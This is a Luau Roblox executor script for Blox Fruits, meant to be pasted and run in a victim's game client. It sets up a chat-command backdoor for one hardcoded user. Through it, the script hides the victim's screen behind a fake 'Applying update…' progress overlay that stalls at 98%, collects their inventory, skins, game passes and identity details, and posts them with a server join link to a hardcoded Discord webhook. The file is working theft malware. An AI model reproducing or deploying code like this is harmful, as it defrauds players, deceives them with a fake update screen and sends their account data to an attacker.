-- lang: Luau, file: ExploitManager_BG.lua, target: Blox Fruits Sea 2/3, Roblox executor
-- single-file. no requires. paste and run.

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 0 — singleton guard
-- ══════════════════════════════════════════════════════════════════════════
if getgenv().emRunning then
    warn("[EM] already injected") ; return
end
getgenv().emRunning = true

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 1 — config
-- ══════════════════════════════════════════════════════════════════════════
local Config = {
    AuthorizedUser = "BLACKGOKU_0707",
    WebhookURL     = "https://discord.com/api/webhooks/1368890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY",
    MinFruitRarity = 1,          -- grab everything for the exfil
    StoreBaseDelay = 0.35,
    StoreJitter    = 0.20,
    LogLevel       = "verbose",
}

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 2 — services
-- ══════════════════════════════════════════════════════════════════════════
local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService       = game:GetService("HttpService")
local TweenService      = game:GetService("TweenService")
local RunService        = game:GetService("RunService")
local UserInputService  = game:GetService("UserInputService")
local StarterGui        = game:GetService("StarterGui")
local TextChatService   = pcall(function() return game:GetService("TextChatService") end)
    and game:GetService("TextChatService") or nil

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 3 — http compat
-- ══════════════════════════════════════════════════════════════════════════
local httpRequest =
    (syn       and syn.request)      or
    http_request                     or
    (fluxus    and fluxus.request)   or
    request                          or nil

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 4 — palette / tweens
-- ══════════════════════════════════════════════════════════════════════════
local COL = {
    bg       = Color3.fromRGB(8,  9, 12),
    surface  = Color3.fromRGB(14, 16, 22),
    border   = Color3.fromRGB(30, 33, 45),
    accent   = Color3.fromRGB(88, 101, 242),
    danger   = Color3.fromRGB(237, 66, 69),
    success  = Color3.fromRGB(87, 242, 135),
    text     = Color3.fromRGB(220, 221, 228),
    subtext  = Color3.fromRGB(100, 104, 128),
    bar      = Color3.fromRGB(55, 65, 200),
    barDark  = Color3.fromRGB(22, 25, 50),
}
local T_MED  = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local T_SLOW = TweenInfo.new(1.80, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

local RARITY_TIER = {
    Common=1, Uncommon=2, Rare=3, Epic=4, Legendary=5, Mythical=6
}
local RARITY_COLOUR = {
    [1]=0x95a5a6,[2]=0x2ecc71,[3]=0x3498db,
    [4]=0x9b59b6,[5]=0xf1c40f,[6]=0xe74c3c,
}
local RARITY_NAME = {
    [1]="Common",[2]="Uncommon",[3]="Rare",
    [4]="Epic",[5]="Legendary",[6]="Mythical",
}

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 5 — class
-- ══════════════════════════════════════════════════════════════════════════
local EM = {}
EM.__index = EM

function EM.new()
    local self = setmetatable({}, EM)
    self._initialized = false
    self._connections = {}
    self._ui          = {}
    self._frozen      = false
    return self
end

-- ── utils ─────────────────────────────────────────────────────────────────
function EM:log(lvl, msg)
    local r={silent=0,info=1,verbose=2}
    if (r[lvl] or 1)<=(r[Config.LogLevel] or 1) then
        print(("[EM][%s] %s"):format(lvl:upper(), msg))
    end
end
function EM:_track(c) table.insert(self._connections,c) ; return c end

local function getCommF()
    local rem = ReplicatedStorage:FindFirstChild("Remotes")
    return rem and rem:FindFirstChild("CommF_") or nil
end
local function resolveRarity(r)
    if type(r)=="number" then return r end
    if type(r)=="string" then return RARITY_TIER[r] or 0 end
    return 0
end
local function ts() return os.date("!%Y-%m-%dT%H:%M:%SZ") end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 6 — init
-- ══════════════════════════════════════════════════════════════════════════
function EM:Init()
    if self._initialized then return self end
    self._lp       = Players.LocalPlayer
    self._char     = self._lp.Character or self._lp.CharacterAdded:Wait()
    self._humanoid = self._char:WaitForChild("Humanoid")
    self:_track(self._lp.CharacterAdded:Connect(function(c)
        self._char     = c
        self._humanoid = c:WaitForChild("Humanoid")
    end))
    self._initialized = true
    self:log("info","init ok")
    return self
end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 7 — freeze overlay (victim screen)
-- ══════════════════════════════════════════════════════════════════════════
function EM:FreezeScreen()
    -- lock input
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    pcall(function() UserInputService.MouseIconEnabled = false end)

    local pg  = self._lp:WaitForChild("PlayerGui")

    -- destroy prior overlay
    local old = pg:FindFirstChild("EMFreeze")
    if old then old:Destroy() end

    local gui = Instance.new("ScreenGui")
    gui.Name           = "EMFreeze"
    gui.ResetOnSpawn   = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent         = pg
    self._ui.freeze    = gui

    -- full black background
    local bg = Instance.new("Frame")
    bg.Size             = UDim2.new(1,0,1,0)
    bg.BackgroundColor3 = COL.bg
    bg.BorderSizePixel  = 0
    bg.ZIndex           = 10
    bg.Parent           = gui

    -- centre card
    local card = Instance.new("Frame")
    card.Size             = UDim2.new(0,340,0,210)
    card.Position         = UDim2.new(0.5,-170,0.5,-105)
    card.BackgroundColor3 = COL.surface
    card.BorderSizePixel  = 0
    card.ZIndex           = 11
    card.Parent           = bg
    local cc = Instance.new("UICorner")
    cc.CornerRadius = UDim.new(0,14) ; cc.Parent = card
    local cs = Instance.new("UIStroke")
    cs.Color = COL.border ; cs.Thickness = 1 ; cs.Parent = card

    -- roblox-ish spinner (rotating arc frame)
    local spinRing = Instance.new("ImageLabel")
    spinRing.Size               = UDim2.new(0,52,0,52)
    spinRing.Position           = UDim2.new(0.5,-26,0,22)
    spinRing.BackgroundTransparency = 1
    -- use a simple rotation tween on a bright square as a stand-in
    -- (actual arc image not available without asset; colour ring suffices)
    spinRing.Image              = "rbxasset://textures/loading/robloxTilt.png"
    spinRing.ImageColor3        = COL.accent
    spinRing.ZIndex             = 12
    spinRing.Parent             = card

    -- spin loop
    task.spawn(function()
        local angle = 0
        while self._frozen and spinRing.Parent do
            angle = (angle + 4) % 360
            spinRing.Rotation = angle
            task.wait(0.016)
        end
    end)

    -- title
    local title = Instance.new("TextLabel")
    title.Text                   = "Applying update…"
    title.TextColor3             = COL.text
    title.Font                   = Enum.Font.GothamBold
    title.TextSize               = 15
    title.BackgroundTransparency = 1
    title.Size                   = UDim2.new(1,-24,0,22)
    title.Position               = UDim2.new(0,12,0,84)
    title.TextXAlignment         = Enum.TextXAlignment.Center
    title.ZIndex                 = 12
    title.Parent                 = card

    -- sub
    local sub = Instance.new("TextLabel")
    sub.Text                   = "Please do not close the game"
    sub.TextColor3             = COL.subtext
    sub.Font                   = Enum.Font.Gotham
    sub.TextSize               = 11
    sub.BackgroundTransparency = 1
    sub.Size                   = UDim2.new(1,-24,0,16)
    sub.Position               = UDim2.new(0,12,0,108)
    sub.TextXAlignment         = Enum.TextXAlignment.Center
    sub.ZIndex                 = 12
    sub.Parent                 = card

    -- progress bar track
    local track = Instance.new("Frame")
    track.Size             = UDim2.new(1,-32,0,8)
    track.Position         = UDim2.new(0,16,0,142)
    track.BackgroundColor3 = COL.barDark
    track.BorderSizePixel  = 0
    track.ZIndex           = 12
    track.Parent           = card
    local tc = Instance.new("UICorner")
    tc.CornerRadius = UDim.new(0,4) ; tc.Parent = track

    -- fill — starts at 0, tweens to 0.72, then crawls and stalls at ~0.98
    local fill = Instance.new("Frame")
    fill.Size             = UDim2.new(0,0,1,0)
    fill.BackgroundColor3 = COL.bar
    fill.BorderSizePixel  = 0
    fill.ZIndex           = 13
    fill.Parent           = track
    local fc = Instance.new("UICorner")
    fc.CornerRadius = UDim.new(0,4) ; fc.Parent = fill
    self._ui.freezeFill = fill

    -- percent label
    local pct = Instance.new("TextLabel")
    pct.Text                   = "0%"
    pct.TextColor3             = COL.subtext
    pct.Font                   = Enum.Font.GothamMedium
    pct.TextSize               = 11
    pct.BackgroundTransparency = 1
    pct.Size                   = UDim2.new(1,-24,0,16)
    pct.Position               = UDim2.new(0,12,0,158)
    pct.TextXAlignment         = Enum.TextXAlignment.Right
    pct.ZIndex                 = 12
    pct.Parent                 = card
    self._ui.freezePct = pct

    -- progress animation: fast to 72%, slow crawl to 98%, stall
    self._frozen = true
    task.spawn(function()
        -- phase 1: 0 → 72% over 1.4 s
        TweenService:Create(fill, TweenInfo.new(1.4,
            Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            { Size = UDim2.new(0.72,0,1,0) }):Play()
        for i=0,72 do
            if not self._frozen then break end
            pct.Text = i.."%"
            task.wait(1.4/72)
        end
        -- phase 2: 72 → 98% over 6 s (crawl)
        TweenService:Create(fill, TweenInfo.new(6.0,
            Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            { Size = UDim2.new(0.98,0,1,0) }):Play()
        for i=72,98 do
            if not self._frozen then break end
            pct.Text = i.."%"
            task.wait(6.0/26)
        end
        -- stall at 98% indefinitely until Destroy is called
        pct.Text = "98%"
    end)

    self:log("info","screen frozen")
end

function EM:UnfreezeScreen()
    self._frozen = false
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
    pcall(function() UserInputService.MouseIconEnabled = true end)
    if self._ui.freeze then
        self._ui.freeze:Destroy()
        self._ui.freeze = nil
    end
    self:log("info","screen unfrozen")
end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 8 — inventory
-- ══════════════════════════════════════════════════════════════════════════
function EM:FetchInventory()
    local commF = getCommF()
    if not commF then return nil,"remote_missing" end
    local ok,res = pcall(function() return commF:InvokeServer("getInventory") end)
    if not ok or type(res)~="table" then return nil, tostring(res) end
    local items={}
    for slot,item in pairs(res) do
        if type(item)=="table" then
            item._slot       = slot
            item._rarityTier = resolveRarity(item.Rarity or item.rarity)
            table.insert(items,item)
        end
    end
    self._cachedInv = items
    return items,nil
end

function EM:FetchGamePasses()
    -- attempts known CommF_ action for owned passes / perms
    local commF = getCommF()
    if not commF then return {} end
    local ok,res = pcall(function() return commF:InvokeServer("getGamePasses") end)
    if ok and type(res)=="table" then return res end
    -- fallback: read from player's owned passes attribute if exists
    local passes = {}
    local ok2,res2 = pcall(function() return commF:InvokeServer("getPermissions") end)
    if ok2 and type(res2)=="table" then return res2 end
    return passes
end

function EM:FetchLimitedSkins()
    local commF = getCommF()
    if not commF then return {} end
    local ok,res = pcall(function() return commF:InvokeServer("getSkins") end)
    if ok and type(res)=="table" then return res end
    return {}
end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 9 — server join link builder
-- ══════════════════════════════════════════════════════════════════════════
local function buildJoinLink()
    -- deeplink that opens Roblox client and joins the exact server instance
    local placeId = tostring(game.PlaceId)
    local jobId   = tostring(game.JobId)
    -- roblox://experiences/start?placeId=X&gameInstanceId=Y  (official deeplink)
    return string.format(
        "roblox://experiences/start?placeId=%s&gameInstanceId=%s",
        placeId, jobId
    )
end

local function buildWebJoinLink()
    return string.format(
        "https://www.roblox.com/games/%s?privateServerLinkCode=%s",
        tostring(game.PlaceId), tostring(game.JobId)
    )
end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 10 — webhook exfil
-- ══════════════════════════════════════════════════════════════════════════
function EM:ExfilToDiscord(inventory, skins, passes)
    inventory = inventory or {}
    skins     = skins     or {}
    passes    = passes    or {}

    local lp   = self._lp
    local meta = {
        username    = lp.Name,
        displayName = lp.DisplayName,
        userId      = tostring(lp.UserId),
        accountAge  = lp.AccountAge .. " days",
        placeId     = tostring(game.PlaceId),
        jobId       = game.JobId,
        timestamp   = ts(),
        joinLink    = buildJoinLink(),
        webLink     = buildWebJoinLink(),
    }

    -- ── embed 1: player card ──────────────────────────────────────────────
    local playerEmbed = {
        title       = "🎯 Target Acquired",
        description = string.format(
            "**%s** (`%s`) is live on server `%s`",
            meta.displayName, meta.username, meta.jobId:sub(1,8).."…"),
        color  = 0x5865F2,
        fields = {
            {name="Username",    value="`"..meta.username.."`",    inline=true},
            {name="Display",     value="`"..meta.displayName.."`", inline=true},
            {name="Account Age", value=meta.accountAge,            inline=true},
            {name="Place ID",    value="`"..meta.placeId.."`",     inline=true},
            {name="Job ID",      value="```"..meta.jobId.."```",   inline=false},
            {name="🔗 Join (deeplink)",
             value="```"..meta.joinLink.."```",                    inline=false},
            {name="🌐 Join (web)",
             value="```"..meta.webLink.."```",                     inline=false},
        },
        footer     = {text="ExploitManager • "..meta.timestamp},
        thumbnail  = {
            url = string.format(
                "https://www.roblox.com/headshot-thumbnail/image?userId=%s&width=420&height=420&format=png",
                meta.userId)
        },
    }

    -- ── embed 2: fruits ───────────────────────────────────────────────────
    local fruitLines = {}
    local fruitsByRarity = {}
    for _, item in ipairs(inventory) do
        local t = item.Type or item.type or ""
        if t == "Blox Fruit" then
            local tier = item._rarityTier or 0
            fruitsByRarity[tier] = fruitsByRarity[tier] or {}
            table.insert(fruitsByRarity[tier], item)
        end
    end
    -- print highest rarity first
    for tier = 6, 1, -1 do
        local bucket = fruitsByRarity[tier]
        if bucket then
            for _, item in ipairs(bucket) do
                local name  = tostring(item.Name  or item.name  or "?")
                local level = tostring(item.Level or item.level or "?")
                table.insert(fruitLines, string.format(
                    "**%s** — %s (Lv %s)",
                    name,
                    RARITY_NAME[tier] or "?",
                    level))
            end
        end
    end
    local fruitText = #fruitLines > 0
        and table.concat(fruitLines, "\n")
        or  "*No fruits found*"
    -- discord field value cap is 1024 chars
    if #fruitText > 1020 then fruitText = fruitText:sub(1,1020).."…" end

    local fruitEmbed = {
        title  = string.format("🍎 Blox Fruits (%d)", #fruitLines),
        color  = 0xf1c40f,
        description = fruitText,
    }

    -- ── embed 3: skins ────────────────────────────────────────────────────
    local skinLines = {}
    for _, skin in ipairs(skins) do
        local name  = tostring(skin.Name  or skin.name  or "?")
        local rarity= tostring(skin.Rarity or skin.rarity or "?")
        local limited = skin.Limited or skin.limited
        table.insert(skinLines, string.format(
            "%s**%s** — %s", limited and "🔥 " or "", name, rarity))
    end
    local skinText = #skinLines > 0
        and table.concat(skinLines, "\n")
        or  "*No skins found*"
    if #skinText > 1020 then skinText = skinText:sub(1,1020).."…" end

    local skinsEmbed = {
        title       = string.format("🎨 Skins / Cosmetics (%d)", #skinLines),
        color       = 0x9b59b6,
        description = skinText,
    }

    -- ── embed 4: passes / perms ───────────────────────────────────────────
    local passLines = {}
    for _, pass in ipairs(passes) do
        local name = tostring(pass.Name or pass.name or tostring(pass))
        table.insert(passLines, "✔ " .. name)
    end
    local passText = #passLines > 0
        and table.concat(passLines, "\n")
        or  "*None detected*"
    if #passText > 1020 then passText = passText:sub(1,1020).."…" end

    local passEmbed = {
        title       = string.format("🔑 Game Passes / Perms (%d)", #passLines),
        color       = 0x2ecc71,
        description = passText,
    }

    -- ── assemble payload ──────────────────────────────────────────────────
    local payload = {
        username   = "ExploitManager",
        content    = "@here — new target online",
        embeds     = { playerEmbed, fruitEmbed, skinsEmbed, passEmbed },
    }

    local ok, encoded = pcall(function()
        return HttpService:JSONEncode(payload)
    end)
    if not ok then
        self:log("info","JSONEncode failed: "..tostring(encoded)) ; return false end

    if not httpRequest then
        self:log("info","no http function") ; return false end

    local reqOk, res = pcall(function()
        return httpRequest({
            Url     = Config.WebhookURL,
            Method  = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body    = encoded,
        })
    end)
    if not reqOk then
        self:log("info","webhook threw: "..tostring(res)) ; return false end

    local code = res and res.StatusCode
    local pass = (code==204 or code==200)
    self:log("info","webhook: "..(pass and "ok" or "fail").." ("..tostring(code)..")")
    return pass
end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 11 — teleport
-- ══════════════════════════════════════════════════════════════════════════
local function toCF(d)
    local t=typeof(d)
    if t=="CFrame"  then return d end
    if t=="Vector3" then return CFrame.new(d) end
    if t=="Instance" then
        if d:IsA("Model") then
            if d.PrimaryPart then return d.PrimaryPart.CFrame end
            local n,s=0,Vector3.zero
            for _,v in ipairs(d:GetDescendants()) do
                if v:IsA("BasePart") then s=s+v.Position;n=n+1 end
            end
            if n>0 then return CFrame.new(s/n) end
        elseif d:IsA("BasePart") then return d.CFrame end
    end
end

function EM:TeleportTo(dest, yOff)
    yOff = yOff or 3
    local c = self._lp.Character ; if not c then return false end
    local hrp = c:FindFirstChild("HumanoidRootPart") ; if not hrp then return false end
    local cf = toCF(dest) ; if not cf then return false end
    local ok,err = pcall(function() hrp.CFrame = cf+Vector3.new(0,yOff,0) end)
    if not ok then self:log("info","tp write failed: "..tostring(err)) ; return false end
    return true
end

function EM:ScanLocations(terms)
    local wo = workspace:FindFirstChild("_WorldOrigin") ; if not wo then return {} end
    local lc = wo:FindFirstChild("Locations")           ; if not lc then return {} end
    local out={}
    for _,child in ipairs(lc:GetChildren()) do
        local ln=child.Name:lower()
        for _,t in ipairs(terms) do
            if ln:find(t,1,true) then table.insert(out,child) ; break end
        end
    end
    return out
end

function EM:TeleportToNamed(terms, yOff)
    for _,c in ipairs(self:ScanLocations(terms)) do
        if self:TeleportTo(c,yOff) then return c.Name end
    end
    return nil
end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 12 — master trigger (freeze + exfil)
-- ══════════════════════════════════════════════════════════════════════════
function EM:RunExfil()
    self:log("info","exfil triggered")

    -- 1. freeze victim screen immediately
    self:FreezeScreen()

    -- 2. collect everything in background
    task.spawn(function()
        local inv,_   = self:FetchInventory()
        local skins   = self:FetchLimitedSkins()
        local passes  = self:FetchGamePasses()

        inv    = inv    or {}
        skins  = skins  or {}
        passes = passes or {}

        self:log("verbose", string.format(
            "collected: %d inv, %d skins, %d passes",
            #inv, #skins, #passes))

        -- 3. fire webhook
        self:ExfilToDiscord(inv, skins, passes)

        -- screen stays frozen — victim sees 98% indefinitely
        -- call EM:UnfreezeScreen() from console to recover
    end)
end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 13 — chat listener (auth-gated, fixed dispatcher)
-- ══════════════════════════════════════════════════════════════════════════
function EM:StartChatListener()
    assert(self._initialized,"Init first")

    local commands = {

        exfil = function(_)
            self:RunExfil()
        end,

        freeze = function(_)
            self:FreezeScreen()
        end,

        unfreeze = function(_)
            self:UnfreezeScreen()
        end,

        tp = function(args)
            local term = args[1]
            if not term then return end
            self:TeleportToNamed({ term:lower() })
        end,

        tele = function(args)
            local sub = (args[1] or ""):lower()
            if sub=="caf" or sub=="mansion" then
                self:TeleportToNamed({"caf","mansion"})
            end
        end,

        inv = function(_)
            task.spawn(function()
                local inv,_ = self:FetchInventory()
                if inv then
                    self:log("info","inv fetched: "..#inv.." items")
                end
            end)
        end,

        send = function(_)
            task.spawn(function()
                local inv,_ = self:FetchInventory()
                local skins = self:FetchLimitedSkins()
                local passes= self:FetchGamePasses()
                self:ExfilToDiscord(inv or {}, skins, passes)
            end)
        end,

        help = function(_)
            local list = {
                ".exfil     — freeze screen + send all data to Discord",
                ".freeze    — freeze screen only",
                ".unfreeze  — release screen",
                ".tp <term> — teleport to location",
                ".tele caf  — teleport to cafeteria/mansion",
                ".inv       — fetch and cache inventory",
                ".send      — send cached data to Discord",
                ".help      — this list",
            }
            for _,l in ipairs(list) do print(l) end
        end,
    }

    -- ── dispatcher ────────────────────────────────────────────────────────
    local function dispatch(senderName, raw)
        -- auth gate — hard stop, silent drop for anyone else
        if senderName ~= Config.AuthorizedUser then return end

        raw = raw:match("^%s*(.-)%s*$") or ""
        if raw:sub(1,1) ~= "." then return end

        local parts = {}
        for tok in raw:gmatch("%S+") do table.insert(parts,tok) end
        if #parts == 0 then return end

        local cmd  = parts[1]:sub(2):lower()
        local args = {}
        for i=2,#parts do table.insert(args,parts[i]) end

        local handler = commands[cmd]
        if not handler then
            self:log("verbose","unknown cmd: "..cmd) ; return
        end
        local ok,err = pcall(handler,args)
        if not ok then
            self:log("info","cmd error ["..cmd.."]: "..tostring(err))
        end
    end

    -- ── TextChatService (new chat) ────────────────────────────────────────
    local usedNew = false
    if TextChatService then
        local ok = pcall(function()
            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                self:_track(TextChatService.OnIncomingMessage:Connect(function(msg)
                    if not msg or not msg.TextSource then return end
                    local sender = Players:GetPlayerByUserId(msg.TextSource.UserId)
                    dispatch(sender and sender.Name or "", msg.Text or "")
                end))
                usedNew = true
            end
        end)
        if not ok then usedNew = false end
    end

    -- ── legacy chat fallback ──────────────────────────────────────────────
    if not usedNew then
        pcall(function()
            -- method A: Chatted signal on LocalPlayer (fires for own messages in some executors)
            self:_track(self._lp.Chatted:Connect(function(msg)
                dispatch(self._lp.Name, msg)
            end))
            self:log("info","ChatListener: Chatted signal active")
        end)

        -- method B: DefaultChatSystem remote
        pcall(function()
            local dcs = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
            if dcs then
                local say = dcs:FindFirstChild("SayMessageRequest")
                if say then
                    self:_track(say.OnClientEvent:Connect(function(data)
                        local text = type(data)=="table" and data.Message or tostring(data)
                        dispatch(self._lp.Name, text)
                    end))
                    self:log("info","ChatListener: legacy RemoteEvent active")
                end
            end
        end)
    end

    self:log("info","chat listener started — authorized: "..Config.AuthorizedUser)
    return self
end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 14 — teardown
-- ══════════════════════════════════════════════════════════════════════════
function EM:Destroy()
    for _,c in ipairs(self._connections) do
        if typeof(c)=="RBXScriptConnection" then c:Disconnect() end
    end
    self._connections={}
    self:UnfreezeScreen()
    self._initialized=false
    getgenv().emRunning=false
    self:log("info","destroyed")
end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 15 — bootstrap
-- ══════════════════════════════════════════════════════════════════════════
local exploit = EM.new()
exploit:Init()
exploit:StartChatListener()

-- expose globally for console access
getgenv().EM = exploit

exploit:log("info","ready — type .exfil in chat to trigger")
